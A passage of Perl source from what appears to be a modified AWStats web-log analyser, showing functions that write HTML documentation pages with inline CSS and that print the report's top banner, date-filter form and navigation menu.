    :root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9;--warning-color:#b91c1c;--note-bg:#fef3c7;--note-border:#f59e0b}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748;--warning-color:#f87171;--note-bg:#4b3d1a;--note-border:#fbbf24}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a{color:var(--link-color);text-decoration:none}a:hover{text-decoration:underline}.step{margin:25px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px}.step h3{margin-top:0;color:var(--link-color)}.migration-notes{margin:30px 0;padding:20px;background-color:var(--note-bg);border:1px solid var(--note-border);border-radius:8px}.migration-notes h2{color:var(--note-border);border-bottom-color:var(--note-border)}.note-item{margin:15px 0;padding:15px;background-color:var(--bg-color);border:1px solid var(--border-color);border-radius:6px}.note-item u{color:var(--note-border);font-weight:bold}.note{font-style:italic;color:var(--link-color);padding:10px;background-color:var(--header-bg);border-left:4px solid var(--link-color);border-radius:4px}.footer{margin-top:40px;padding:20px;text-align:center;border-top:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin:5px 0}code{background-color:var(--code-bg);padding:2px 4px;border-radius:4px;font-family:monospace}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    <div class="section">
        $content
    </div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_upgrade.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_upgrade.html in $doc_dir with language $lang\n" if $Debug;
}
#------------------------------------------------------------------------------
# 生成 webmin 文档页面
# Parameters: $dir (webmin目录)
# Return: None
#------------------------------------------------------------------------------
sub generate_webmin_doc {
    my ($dir) = @_;
    
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = _t("sponsor.section");
	my $theme_script = get_theme_script();
    my $doc_title = _t("docs.webmin.title");
    my $subtitle = _t("docs.webmin.subtitle");
    my $content = _t("docs.webmin.content");
    $content =~ s/\\n/\n/g;
    my $full_title = "$doc_title - $page_title";
    
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats $doc_title">
    <meta name="keywords" content="awstats, webmin, module, administration">
    <title>$full_title</title>
    <style>
    :root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9;--section-border:#9999cc;--result-bg:#e6f3ff;--config-bg:#fef3c7}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748;--section-border:#6677aa;--result-bg:#1e3a5f;--config-bg:#4b3d1a}body{font-family:system-ui,-apple-system,sans-serif;line-height:1.6;max-width:1000px;margin:0 auto;padding:20px;background-color:var(--bg-color);color:var(--text-color)}h1,h2,h3{color:var(--text-color);border-bottom:1px solid var(--border-color);padding-bottom:10px}a{color:var(--link-color);text-decoration:none}a:hover{text-decoration:underline}.webmin-section{margin:30px 0;padding:20px;background-color:var(--header-bg);border:1px solid var(--border-color);border-radius:8px}.webmin-section h2{margin-top:0;color:var(--section-border);border-bottom-color:var(--section-border)}.config-details{margin:20px 0;padding:15px;background-color:var(--config-bg);border:1px solid var(--border-color);border-radius:6px}.config-details h4{margin:15px 0 5px;color:var(--link-color)}.config-details h4:first-child{margin-top:0}.result{margin:15px 0;padding:10px;background-color:var(--result-bg);border-left:4px solid var(--link-color);border-radius:4px;font-style:italic}.section-nav{background-color:var(--header-bg);padding:15px;border-radius:8px;border:1px solid var(--border-color);margin:20px 0}.section-nav li{margin:8px 0}.footer{margin-top:40px;padding:20px;text-align:center;border-top:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin:8px 0}code{background-color:var(--code-bg);padding:2px 6px;border-radius:4px;font-family:monospace;font-size:0.95em}
    </style>
</head>
<body>
    <h1>$doc_title</h1>
    <div class="subtitle">$subtitle</div>
    <div class="section">
        $content
    </div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/awstats_webmin.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated awstats_webmin.html in $doc_dir with language $lang\n" if $Debug;
}
#------------------------------------------------------------------------------
# 生成首页内容页面
# Parameters: $dir (首页介绍)
# Return: None
#------------------------------------------------------------------------------
sub generate_home_doc {
    my ($dir) = @_;
    
    my $page_title = sprintf(_t("Advanced Web Statistics %s"), $SiteDomain);
	my $SPONSOR_SECTION = _t("sponsor.section");
	my $theme_script = get_theme_script();
    my $doc_title = _t("docs.home.title");
    my $subtitle = _t("docs.home.subtitle");
    my $content = _t("docs.home.content");
    $content =~ s/\\n/\n/g;
    my $full_title = "$doc_title - $page_title";
    
    my $lang = $Lang || 'en';
    my $dir_attr = $PageDir ? 'rtl' : 'ltr';
    
    my $html = <<"END_HTML";
<!DOCTYPE html>
<html lang="$lang" dir="$dir_attr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="AWStats - 专业的开源日志分析工具">
    <meta name="keywords" content="awstats, log analyzer, web statistics, 日志分析, 网站统计">
    <title>$full_title</title>
    <style>
    :root{--bg-color:#ffffff;--text-color:#1f2937;--link-color:#2563eb;--border-color:#e5e7eb;--header-bg:#f9fafb;--code-bg:#f1f5f9;--primary-color:#3b82f6;--primary-hover:#2563eb;--secondary-color:#8b5cf6;--accent-color:#10b981;--card-bg:#ffffff;--hero-bg:linear-gradient(135deg,#667eea 0%,#764ba2 100%);--hero-text:#ffffff;--new-badge:#ef4444;--improved-badge:#f59e0b}[data-theme="dark"]{--bg-color:#1f2937;--text-color:#f3f4f6;--link-color:#60a5fa;--border-color:#374151;--header-bg:#111827;--code-bg:#2d3748;--primary-color:#3b82f6;--primary-hover:#60a5fa;--secondary-color:#a78bfa;--accent-color:#34d399;--card-bg:#2d3748;--hero-bg:linear-gradient(135deg,#434190 0%,#553c9a 100%);--hero-text:#f3f4f6;--new-badge:#f87171;--improved-badge:#fbbf24}body{font-family:system-ui,-apple-system,'Segoe UI',Roboto,sans-serif;line-height:1.6;margin:0;padding:0;background-color:var(--bg-color);color:var(--text-color)}.home-content{max-width:1200px;margin:0 auto;padding:0 20px}h1,h2,h3{color:var(--text-color)}a{color:var(--link-color);text-decoration:none}a:hover{text-decoration:underline}.hero-section{background:var(--hero-bg);color:var(--hero-text);border-radius:24px;padding:60px 40px;margin:40px 0;display:flex;align-items:center;gap:40px}.hero-content{flex:1}.hero-title{font-size:3em;margin:0 0 20px;color:white}.hero-description{font-size:1.2em;margin-bottom:30px;opacity:0.95}.hero-stats{font-size:1.1em;margin-bottom:30px;opacity:0.9}.stat-number{font-weight:bold;font-size:1.3em}.hero-buttons{display:flex;gap:15px}.button{display:inline-block;padding:12px 30px;border-radius:30px;font-weight:600;transition:all 0.3s ease}.button-primary{background:white;color:#4c51bf}.button-primary:hover{background:#f0f0f0;transform:translateY(-2px);text-decoration:none}.button-secondary{background:transparent;color:white;border:2px solid white}.button-secondary:hover{background:rgba(255,255,255,0.1);transform:translateY(-2px);text-decoration:none}.button-large{padding:15px 40px;font-size:1.1em}.button-text{padding:0;color:var(--link-color);background:none}.hero-image{flex:1;text-align:center}.dashboard-preview{max-width:100%;border-radius:12px;box-shadow:0 20px 40px rgba(0,0,0,0.2)}.section-title{font-size:2.5em;text-align:center;margin:60px 0 20px}.section-subtitle{text-align:center;font-size:1.2em;color:var(--text-color);opacity:0.8;margin-bottom:40px}.features-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;margin:40px 0}.feature-card{background:var(--card-bg);border:1px solid var(--border-color);border-radius:16px;padding:30px;transition:all 0.3s ease}.feature-card:hover{transform:translateY(-5px);box-shadow:0 10px 30px rgba(0,0,0,0.1)}.feature-icon{font-size:3em;margin-bottom:20px}.feature-card h3{margin:0 0 15px;font-size:1.3em}.feature-card p{margin:0;color:var(--text-color);opacity:0.9}.whatsnew-section{background:var(--header-bg);border:1px solid var(--border-color);border-radius:24px;padding:40px;margin:60px 0;position:relative}.whatsnew-badge{position:absolute;top:-15px;left:40px;background:var(--new-badge);color:white;padding:5px 20px;border-radius:30px;font-weight:bold;font-size:1em}.version-date{text-align:center;color:var(--text-color);opacity:0.7;margin-top:-10px}.whatsnew-desc{font-size:1.2em;text-align:center;margin:20px 0 30px}.whatsnew-list{list-style:none;padding:0;margin:0;display:grid;grid-template-columns:repeat(auto-fit,minmax(400px,1fr));gap:15px}.whatsnew-list li{padding:15px;background:var(--bg-color);border:1px solid var(--border-color);border-radius:12px;line-height:1.5}.new-badge{background:var(--new-badge);color:white;padding:2px 8px;border-radius:12px;font-size:0.8em;font-weight:bold;margin-right:8px;display:inline-block}.improved-badge{background:var(--improved-badge);color:white;padding:2px 8px;border-radius:12px;font-size:0.8em;font-weight:bold;margin-right:8px;display:inline-block}.whatsnew-footer{text-align:center;margin-top:30px}.technical-section{margin:60px 0}.technical-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(350px,1fr));gap:20px;margin:40px 0}.technical-item{display:flex;align-items:flex-start;gap:15px;padding:20px;background:var(--card-bg);border:1px solid var(--border-color);border-radius:12px}.technical-check{font-size:1.5em}.technical-text{flex:1}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px;margin:40px 0}.stat-card{text-align:center;padding:30px;background:var(--card-bg);border:1px solid var(--border-color);border-radius:16px}.stat-icon{font-size:3em;margin-bottom:20px}.stat-card h3{margin:0 0 15px}.cta-section{background:linear-gradient(135deg,var(--primary-color) 0%,var(--secondary-color) 100%);color:white;border-radius:24px;padding:60px;text-align:center;margin:60px 0}.cta-title{font-size:2.5em;margin:0 0 20px;color:white}.cta-desc{font-size:1.2em;margin-bottom:30px;opacity:0.95}.cta-buttons{display:flex;gap:20px;justify-content:center}.home-footer{text-align:center;padding:40px 0;border-top:1px solid var(--border-color);margin-top:40px}.footer-links{margin-top:10px}.footer-links a{color:var(--text-color);opacity:0.8}.footer-links a:hover{opacity:1}\@media (max-width:768px){.hero-section{flex-direction:column;padding:40px 20px}.hero-title{font-size:2em}.whatsnew-list{grid-template-columns:1fr}.cta-section{padding:40px 20px}.cta-buttons{flex-direction:column}}
    </style>
</head>
<body>
    <div class="home-content">
        $content
    </div>
	<div id="sponsor" class="section">
	$SPONSOR_SECTION
    </div>
$theme_script
</body>
</html>
END_HTML

    my $doc_dir = "$dir/docs";
    open(my $fh, '>:encoding(UTF-8)', "$doc_dir/index.html") or return;
    print $fh $html;
    close $fh;

    print "DEBUG: Generated home page (index.html) in $doc_dir with language $lang\n" if $Debug;
}

#------------------------------------------------------------------------------
# Function:     Prints the top banner of the inner frame or static page
# Parameters:   $WIDTHMENU1
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLTopBanner{
	my $WIDTHMENU1 = shift;
	my $frame = ( $FrameName eq 'mainleft' );
	my $title = _t("AWStats Log Viewer");
	if ($Debug) { debug( "ShowTopBan", 2 ); }
	print "$Center<a name=\"menu\">&nbsp;</a>\n";

	if ( $FrameName ne 'mainleft' ) {
		my $NewLinkParams = ${QueryString};
		$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
		$NewLinkParams =~ s/(^|&|&amp;)year=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)month=[^&]*//i;
		$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
		$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
		$NewLinkParams =~ s/^&amp;//;
		$NewLinkParams =~ s/&amp;$//;
		my $NewLinkTarget = '';

		if ( $FrameName eq 'mainright' ) {
			$NewLinkTarget = " target=\"_parent\"";
		}
		print "<form name=\"FormDateFilter\" action=\""
		  . XMLEncode("$AWScript${NewLinkParams}")
		  . "\" style=\"padding: 0px 0px 20px 0px; margin-top: 0\"$NewLinkTarget>\n";
	}

	if ( $QueryString !~ /buildpdf/i ) {
		print
"<table class=\"aws_border\" border=\"0\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\">\n";
		print "<tr><td>\n";
		print
"<table class=\"aws_data sortable\" border=\"0\" cellpadding=\"1\" cellspacing=\"0\" width=\"100%\">\n";
	}
	else {
		print "<table width=\"100%\">\n";
	}

	if ( $FrameName ne 'mainright' ) {

		# Print Statistics Of
		if ( $FrameName eq 'mainleft' ) {
			my $shortSiteDomain = $SiteDomain;
			if ( length($SiteDomain) > 30 ) {
				$shortSiteDomain =
				    substr( $SiteDomain, 0, 20 ) . "..."
				  . substr( $SiteDomain, length($SiteDomain) - 5, 5 );
			}
			print
"<tr><td class=\"awsm\"><b>" . _t("Site") . ":</b></td></tr><tr><td class=\"aws\"><span style=\"font-size: 12px;\">$shortSiteDomain</span></td>";
		}
		else {
			print
"<tr><td class=\"aws\" valign=\"middle\"><b>" . _t("Site") . ":</b>&nbsp;</td><td class=\"aws\" valign=\"middle\"><span style=\"font-size: 14px;\">$SiteDomain</span></td>";
		}

		# Logo and flags
		if ( $FrameName ne 'mainleft' ) {
			if ( $LogoLink =~ "https://www.awstats.org" ) {
				print "<td align=\"right\" rowspan=\"3\"><a href=\""
				  . XMLEncode($LogoLink)
				  . "\" target=\"awstatshome\"><img src=\"$DirIcons/other/$Logo\" border=\"0\""
				  . AltTitle( ucfirst($PROG) . " " . _t("Web Site") )
				  . " /></a>";
			}
			else {
				print "<td align=\"right\" rowspan=\"3\"><a href=\""
				  . XMLEncode($LogoLink)
				  . "\" target=\"awstatshome\"><img src=\"$DirIcons/other/$Logo\" border=\"0\" /></a>";
			}
			if ( !$StaticLinks ) { print "<br />"; Show_Flag_Links($Lang); }
			print "</td>";
		}
		print "</tr>\n";
	}
	if ( $FrameName ne 'mainleft' ) {

		# Print Last Update
		print
"<tr valign=\"middle\"><td class=\"aws\" valign=\"middle\" width=\"$WIDTHMENU1\"><b>" . _t("Last Update") . ":</b>&nbsp;</td>";
		print
"<td class=\"aws\" valign=\"middle\"><span style=\"font-size: 12px;\">";
		if ($LastUpdate) { print Format_Date( $LastUpdate, 0 ); }
		else {

			# Here NbOfOldLines = 0 (because LastUpdate is not defined)
			if ( !$UpdateStats ) {
				print "<span style=\"color: #880000\">" . _t("Never updated") . "</span>";
			}
			else {
				print
 "<span style=\"color: #880000\">" . _t("No qualified records found in log") . " 
 ($NbOfLinesCorrupted " . _t("corrupted") . ", $NbOfLinesComment " . _t("comments") . ", $NbOfLinesBlank " . _t("Blank") . ", 
 $NbOfLinesDropped " . _t("dropped") . ")</span>";
			}
		}
		print "</span>";

		# Print Update Now link
		if ( $AllowToUpdateStatsFromBrowser && !$StaticLinks ) {
			my $NewLinkParams = ${QueryString};
			$NewLinkParams =~ s/(^|&|&amp;)update(=\w*|$)//i;
			$NewLinkParams =~ s/(^|&|&amp;)staticlinks(=\w*|$)//i;
			$NewLinkParams =~ s/(^|&|&amp;)framename=[^&]*//i;
			if ( $FrameName eq 'mainright' ) {
				$NewLinkParams .= "&amp;framename=mainright";
			}
			$NewLinkParams =~ s/(&amp;|&)+/&amp;/i;
			$NewLinkParams =~ s/^&amp;//;
			$NewLinkParams =~ s/&amp;$//;
			if ($NewLinkParams) { $NewLinkParams = "${NewLinkParams}&amp;"; }
			print "&nbsp; &nbsp; &nbsp; &nbsp;";
			print "<a href=\""
			  . XMLEncode("$AWScript${NewLinkParams}update=1")
			  . "\">" . _t("Update now") . "</a>";
		}
		print "</td>";

		# Logo and flags
		if ( $FrameName eq 'mainright' ) {
			if ( $LogoLink =~ "https://www.awstats.org" ) {
				print "<td align=\"right\" rowspan=\"2\"><a href=\""
				  . XMLEncode($LogoLink)
				  . "\" target=\"awstatshome\"><img src=\"$DirIcons/other/$Logo\" border=\"0\""
				  . AltTitle( ucfirst($PROG) . " " . _t("Web Site") )
				  . " /></a>\n";
			}
			else {
				print "<td align=\"right\" rowspan=\"2\"><a href=\""
				  . XMLEncode($LogoLink)
				  . "\" target=\"awstatshome\"><img src=\"$DirIcons/other/$Logo\" border=\"0\" /></a>\n";
			}
			if ( !$StaticLinks ) { print "<br />"; Show_Flag_Links($Lang); }
			print "</td>";
		}

		print "</tr>\n";

		# Print selected period of analysis (month and year required)
		print "<tr><td class=\"aws\" valign=\"middle\"><b>" . _t("Period") . ":</b></td>";
		print "<td class=\"aws\" valign=\"middle\">";
		if ( $ENV{'GATEWAY_INTERFACE'} || !$StaticLinks ) {
			print "<select class=\"aws_formfield\" name=\"databasebreak\">\n";
			print "<option"
			  . ( $DatabaseBreak eq "month" ? " selected=\"selected\"" : "" )
			  . " value=\"month\">" . _t("Month") . "</option>\n";
			print "<option"
			  . ( $DatabaseBreak eq "day" ? " selected=\"selected\"" : "" )
			  . " value=\"day\">" . _t("Day") . "</option>\n";
			print "<option"
			  . ( $DatabaseBreak eq "hour" ? " selected=\"selected\"" : "" )
			  . " value=\"hour\">" . _t("Hour") . "</option>\n";
			print "</select>\n";

			print "<select class=\"aws_formfield\" name=\"month\">\n";
			foreach ( 1 .. 12 ) {
				my $monthix = sprintf( "%02s", $_ );
				
				my $month_display = sprintf(_t("date_format_month"), 
											$MonthNumLib{$monthix}, 
											$YearRequired);
				
				print "<option"
					. ( "$MonthRequired" eq "$monthix" ? " selected=\"selected\"" : "" )
					. " value=\"$monthix\">$month_display</option>\n";
			}
			
			if ( $AllowFullYearView >= 2 ) {
				print "<option"
				  . ( $MonthRequired eq 'all' ? " selected=\"selected\"" : "" )
				  . " value=\"all\">- " . _t("Year") . " -</option>\n";
			}
			print "</select>\n";
			print "<select class=\"aws_formfield\" name=\"year\">\n";

			# Add YearRequired in list if not in ListOfYears
			$ListOfYears{$YearRequired} ||= $MonthRequired;
			foreach ( sort keys %ListOfYears ) {
				print "<option"
				  . ( $YearRequired eq "$_" ? " selected=\"selected\"" : "" )
				  . " value=\"$_\">$_</option>\n";
			}
			print "</select>\n";

			if (	$DatabaseBreak eq 'day' || 
					$DatabaseBreak eq 'hour') {
				if (!$DayRequired) {
					$DayRequired = $nowday; 
				}
				print "<select class=\"aws_formfield\" name=\"day\">\n";
				foreach ( 1 .. 31 ) {
					print "<option"
					  . ( $DayRequired eq "$_" ? " selected=\"selected\"" : "" )
					  . " value=\"$_\">$_</option>\n";
				}
				print "</select>\n";
			}

			if (	$DatabaseBreak eq 'hour') {
				if (!$HourRequired) {
					$HourRequired = $nowhour; 
				}
				print "<select class=\"aws_formfield\" name=\"hour\">\n";
				foreach ( 0 .. 23 ) {
					print "<option"
					  . ( $HourRequired eq "$_" ? " selected=\"selected\"" : "" )
					  . " value=\"$_\">$_</option>\n";
				}
				print "</select>\n";
			}

			print "<input type=\"hidden\" name=\"output\" value=\""
			  . join( ',', keys %HTMLOutput )
			  . "\" />\n";
			if ($SiteConfig) {
				print
"<input type=\"hidden\" name=\"config\" value=\"$SiteConfig\" />\n";
			}
			if ($DirConfig) {
				print
"<input type=\"hidden\" name=\"configdir\" value=\"$DirConfig\" />\n";
			}
			if ( $QueryString =~ /lang=(\w+)/i ) {
				print
				  "<input type=\"hidden\" name=\"lang\" value=\"$1\" />\n";
			}
			if ( $QueryString =~ /debug=(\d+)/i ) {
				print
				  "<input type=\"hidden\" name=\"debug\" value=\"$1\" />\n";
			}
			if ( $FrameName eq 'mainright' ) {
				print
"<input type=\"hidden\" name=\"framename\" value=\"index\" />\n";
			}
			print
"<input type=\"submit\" value=\" " . _t("OK") . " \" class=\"aws_button\" />";
		}
		else {
			print "<span style=\"font-size: 14px;\">";
			if ($DayRequired) { print _t("Day") . " $DayRequired - "; }
			if ( $MonthRequired eq 'all' ) {
				print _t("Year") . " $YearRequired";
			}
			else {
				print sprintf(_t("date_format_month"), $MonthNumLib{$MonthRequired}, $YearRequired);
			}
			print "</span>";
		}
		print "</td></tr>\n";
	}
	if ( $QueryString !~ /buildpdf/i ) {
		print "</table>\n";
		print "</td></tr></table>\n";
	}
	else {
		print "</table>\n";
	}

	if ( $FrameName ne 'mainleft' ) { print "</form><br />\n"; }
	else { print "<br />\n"; }
	print "\n";
}

#------------------------------------------------------------------------------
# Function:     Prints the menu in a frame or below the top banner
# Parameters:   _
# Input:        _
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMenu{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	my $frame = ( $FrameName eq 'mainleft' );

	if ($Debug) { debug( "ShowMenu", 2 ); }

	# Print menu links
	if ( ( $HTMLOutput{'main'} && $FrameName ne 'mainright' )
		|| $FrameName eq 'mainleft' )
	{    # If main page asked
		    # Define link anchor
		my $linkanchor =
		  ( $FrameName eq 'mainleft' ? "$AWScript${NewLinkParams}" : "" );
		if ( $linkanchor && ( $linkanchor !~ /framename=mainright/ ) ) {
			$linkanchor .= "framename=mainright";
		}
		$linkanchor =~ s/(&|&amp;)$//;
		$linkanchor = XMLEncode("$linkanchor");

		# Define target
		my $targetpage =
		  ( $FrameName eq 'mainleft' ? " target=\"mainright\"" : "" );

		# Print Menu
		my $linetitle;    # TODO a virer
		if ( !$PluginsLoaded{'ShowMenu'}{'menuapplet'} ) {
			my $menuicon = 0;    # TODO a virer
			                     # Menu HTML
			print "<table"
			  . (
				$frame
				? " cellspacing=\"0\" cellpadding=\"0\" border=\"0\""
				: ""
			  )
			  . ">\n";
			if ( $FrameName eq 'mainleft' && $ShowMonthStats ) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
"<a href=\"$linkanchor#top\"$targetpage>" . _t("Top") . "</a>";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			my %menu     = ();
			my %menulink = ();
			my %menutext = ();

			# When
			%menu = (
				'month'       => $ShowMonthStats       ? 1 : 0,
				'daysofmonth' => $ShowDaysOfMonthStats ? 2 : 0,
				'daysofweek'  => $ShowDaysOfWeekStats  ? 3 : 0,
				'hours'       => $ShowHoursStats       ? 4 : 0
			);
			%menulink = (
				'month'       => 1,
				'daysofmonth' => 1,
				'daysofweek'  => 1,
				'hours'       => 1
			);
			%menutext = (
				'month'       => _t("Month"),
				'daysofmonth' => _t("Day"),
				'daysofweek'  => _t("Day of week"),
				'hours'       => _t("Hours")
			);
			HTMLShowMenuCateg(
				'when',         _t("When"),
				'menu4.png',    $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);

			# Who
			%menu = (
				'countries'  => $ShowDomainsStats ? 1 : 0,
				'alldomains' => $ShowDomainsStats ? 2 : 0,
				'visitors'   => $ShowHostsStats   ? 3 : 0,
				'allhosts'   => $ShowHostsStats   ? 4 : 0,
				'lasthosts' => ( $ShowHostsStats =~ /L/i ) ? 5 : 0,
                'unknownip' => $ShowHostsStats ? 6 : 0,
				'logins'    => $ShowAuthenticatedUsers ? 7 : 0,
				'alllogins' => $ShowAuthenticatedUsers ? 8 : 0,
				'lastlogins' => ( $ShowAuthenticatedUsers =~ /L/i ) ? 9 : 0,
				'emailsenders' => $ShowEMailSenders ? 10 : 0,
				'allemails'    => $ShowEMailSenders ? 11 : 0,
				'lastemails' => ( $ShowEMailSenders =~ /L/i ) ? 12 : 0,
				'emailreceivers' => $ShowEMailReceivers ? 13 : 0,
				'allemailr'      => $ShowEMailReceivers ? 14 : 0,
				'lastemailr' => ( $ShowEMailReceivers =~ /L/i ) ? 15 : 0,
				'robots'    => $ShowRobotsStats ? 16 : 0,
				'allrobots' => $ShowRobotsStats ? 17 : 0,
				'lastrobots' => ( $ShowRobotsStats =~ /L/i ) ? 18 : 0,
				'worms' => $ShowWormsStats ? 19 : 0
			);
			%menulink = (
				'countries'      => 1,
				'alldomains'     => 2,
				'visitors'       => 1,
				'allhosts'       => 2,
				'lasthosts'      => 2,
				'unknownip'      => 2,
				'logins'         => 1,
				'alllogins'      => 2,
				'lastlogins'     => 2,
				'emailsenders'   => 1,
				'allemails'      => 2,
				'lastemails'     => 2,
				'emailreceivers' => 1,
				'allemailr'      => 2,
				'lastemailr'     => 2,
				'robots'         => 1,
				'allrobots'      => 2,
				'lastrobots'     => 2,
				'worms'          => 1
			);
			%menutext = (
				'countries'      => _t("Countries"),
				'alldomains'     => _t("Full list"),
				'visitors'       => _t("Visitors"),
				'allhosts'       => _t("Full list"),
				'lasthosts'      => _t("Last"),
				'unknownip'      => _t("Unresolved IP Address"),
				'logins'         => _t("Login"),
				'alllogins'      => _t("Full list"),
				'lastlogins'     => _t("Last"),
				'emailsenders'   => _t("Email Senders"),
				'allemails'      => _t("Full list"),
				'lastemails'     => _t("Last"),
				'emailreceivers' => _t("Email Receivers"),
				'allemailr'      => _t("Full list"),
				'lastemailr'     => _t("Last"),
				'robots'         => _t("Robots"),
				'allrobots'      => _t("Full list"),
				'lastrobots'     => _t("Last"),
				'worms'          => _t("Worms")
			);
			HTMLShowMenuCateg(
				'who',          _t("Who"),
				'menu5.png',    $frame,
				$targetpage,    $linkanchor,
				$NewLinkParams, $NewLinkTarget,
				\%menu,         \%menulink,
				\%menutext
			);

			# Navigation
			$linetitle = &AtLeastOneNotNull(
				$ShowSessionsStats,  $ShowPagesStats,
				$ShowFileTypesStats, $ShowFileSizesStats,
				$ShowOSStats,        $ShowBrowsersStats,
				$ShowScreenSizeStats, $ShowDownloadsStats
			);
			if ($linetitle) {
				print "<tr><td class=\"awsm\""
				  . ( $frame ? "" : " valign=\"top\"" ) . ">"
				  . (
					$menuicon
					? "<img src=\"$DirIcons/other/menu2.png\" />&nbsp;"
					: ""
				  )
				  . "<b>" . _t("Navigation") . ":</b></td>\n";
			}
			if ($linetitle) {
				print( $frame? "</tr>\n" : "<td class=\"awsm\">" );
			}
			if ($ShowSessionsStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
"<a href=\"$linkanchor#sessions\"$targetpage>" . _t("Visits duration") . "</a>";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
                        if ($ShowFileSizesStats) {
                                print ( $frame? "<tr><td class=\"awsm\">" : "" );
                                print
"<a href=\"$linkanchor#filesizes\"$targetpage>" . _t("File size") . "</a>";
                                print ( $frame? "</td></tr>\n" : " &nbsp; ");
                        }
                        if ($ShowRequestTimesStats) {
                                print( $frame? "<tr><td class=\"awsm\">" : "" );
                                print
"<a href=\"$linkanchor#requesttimes\"$targetpage>" . _t("Request time") . "</a>";
                                print ($frame? "</td></tr>\n" : " &nbsp; " );
                        }
			if ($ShowFileTypesStats && $LevelForFileTypesDetection > 0) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
"<a href=\"$linkanchor#filetypes\"$targetpage>" . _t("File type") . "</a>";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowDownloadsStats && $LevelForFileTypesDetection > 0) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
"<a href=\"$linkanchor#downloads\"$targetpage>" . _t("Downloads") . "</a>";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
				print( $frame
					? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
					: ""
				);
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=downloads")
					: "$StaticLinks.downloads.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Full list") . "</a>\n";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowPagesStats) {
				print( $frame? "<tr><td class=\"awsm\">" : "" );
				print
"<a href=\"$linkanchor#urls\"$targetpage>" . _t("Viewed pages") . "</a>\n";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ($ShowPagesStats) {
				print( $frame
					? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
					: ""
				);
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=urldetail")
					: "$StaticLinks.urldetail.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Full list") . "</a>\n";
				print( $frame? "</td></tr>\n" : " &nbsp; " );
			}
			if ( $ShowPagesStats =~ /E/i ) {
				print( $frame
					? "<tr><td class=\"awsm\"> &nbsp; <img height=\"8\" width=\"9\" src=\"$DirIcons/other/page.png\" alt=\"...\" /> "
					: ""
				);
				print "<a href=\""
				  . (
					$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
					? XMLEncode(
						"$AWScript${NewLinkParams}output=urlentry")
					: "$StaticLinks.urlentry.$StaticExt"
				  )
				  . "\"$NewLinkTarget>" . _t("Entry") . "</a>\n";
